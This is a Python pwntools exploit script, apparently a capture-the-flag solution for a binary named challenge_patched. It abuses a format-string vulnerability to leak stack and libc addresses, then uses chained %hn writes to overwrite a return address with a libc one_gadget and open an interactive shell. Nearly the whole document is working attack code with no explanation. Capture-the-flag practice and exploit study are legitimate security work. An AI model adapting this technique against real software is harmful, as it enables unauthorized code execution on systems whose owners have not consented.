#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
libc.sym['one_gadget'] = 0xe3b01
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+305
                   c                 
                   ''')
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = b'<\0>' + b'%40$p%53$p'.ljust(27, b'A') + b'</'

    r.sendafter(b" WTML!\n", payload)
    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')

    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')

    r.recvuntil(b">")
    leak_stack = int(r.recv(14), 16)
    ret_replace_2 = leak_stack - 0x58
    leak_libc = int(r.recv(14), 16)
    libc.address = leak_libc - 147587
    log.info("leak libc & leak stack: " +
             hex(leak_libc) + " " + hex(leak_stack))
    log.info("libc base: " + hex(libc.address))

    package = {
        (libc.sym['one_gadget'] >> 0) & 0xffff: ret_replace_2 + 0,
        (libc.sym['one_gadget'] >> 16) & 0xffff: ret_replace_2 + 2,
        (libc.sym['one_gadget'] >> 32) & 0xffff: ret_replace_2 + 4,
    }
    order = sorted(package)
    payload = f'%{order[0]}c%20$hn'.encode()
    payload += f'%{order[1] - order[0]}c%21$hn'.encode()
    payload += f'%{order[2] - order[1]}c%22$hn'.encode()
    payload = payload.ljust(0x60, b'P')
    payload += flat(
        package[order[0]],
        package[order[1]],
        package[order[2]],
    )
    r.sendlineafter(b'about v2: ', payload)
    r.interactive()


if __name__ == "__main__":
    main()
